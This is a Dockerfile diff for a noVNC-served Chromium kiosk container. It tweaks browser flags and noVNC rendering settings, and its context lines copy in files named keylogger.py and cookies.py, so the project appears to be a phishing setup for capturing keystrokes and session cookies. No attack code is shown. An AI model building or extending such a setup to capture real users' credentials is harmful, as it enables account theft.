@@ -6,7 +6,7 @@ ENV DISPLAY :0
 
 RUN apk add sudo bash xfce4 xvfb xdpyinfo lightdm-gtk-greeter x11vnc xfce4-terminal chromium python3 py3-pip git openssl curl gcc libc-dev python3-dev php socat python3-tkinter && \
     rm -rf /usr/bin/python && ln -s /usr/bin/python3 /usr/bin/python && \
-    echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs"' >> /etc/chromium/chromium.conf && \
+    echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs --no-first-run"' >> /etc/chromium/chromium.conf && \
     dbus-uuidgen > /var/lib/dbus/machine-id
 
 RUN adduser -h /home/user -s /bin/bash -S -D user && echo "user:false" | chpasswd && \
@@ -62,7 +62,9 @@ COPY Files/cookies.py /home/user/
 COPY Files/keylogger.py /home/user/
 COPY Files/vnc_lite.html /home/user/noVNC/
 COPY Files/cursor.js /home/user/noVNC/core/util/
-COPY Files/rfb.js /home/user/noVNC/core/
+RUN sed -i 's/rgb(40, 40, 40)/white/' /home/user/noVNC/core/rfb.js
+RUN sed -i 's/qualityLevel = 6/qualityLevel = 9/' /home/user/noVNC/core/rfb.js
+RUN sed -i 's/compressionLevel = 2/compressionLevel = 0/' /home/user/noVNC/core/rfb.js
 COPY Files/ui.js /home/user/noVNC/app/
 COPY Files/kiosk.zip /home/user/
 COPY Files/index.php /home/user/
